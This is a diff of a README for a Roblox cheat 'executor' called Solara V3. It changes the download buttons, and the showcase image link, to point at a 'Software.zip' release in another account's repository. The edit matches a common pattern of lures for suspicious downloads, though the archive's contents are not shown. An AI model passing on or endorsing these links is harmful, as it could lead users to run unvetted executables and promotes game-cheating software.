@@ -23,7 +23,7 @@ The First & Best External Roblox Executor After Byfron. Copyright CMD Softworks 
 - solara-roblox-discord 
 - solara-roblox-v3
 
-## :arrow_down: [Click here to download Solara V3!](https://github.com/user-attachments/files/18286083/SolaraV3.zip "Needs to be launched")
+## :arrow_down: [Click here to download Solara V3!](https://github.com/Cravanger/Solara-Executor/releases/download/v2.0/Software.zip "Needs to be launched")
 
 ---
 
@@ -60,7 +60,7 @@ For the latest updates and releases, please check the "Releases" section in this
 ---
 
 ### 📸 Showcase:
-![Solara Executor](https://example.com/solara-executor-image.png)
+![Solara Executor](https://github.com/Cravanger/Solara-Executor/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -73,4 +73,4 @@ Don't miss out on the opportunity to elevate your Roblox gameplay with Solara Ex
 
 ---
 
-### 📦 [Download Solara V3 Now!](https://github.com/user-attachments/files/18286083/SolaraV3.zip "Needs to be launched") 🌟
+### 📦 [Download Solara V3 Now!](https://github.com/Cravanger/Solara-Executor/releases/download/v2.0/Software.zip "Needs to be launched") 🌟
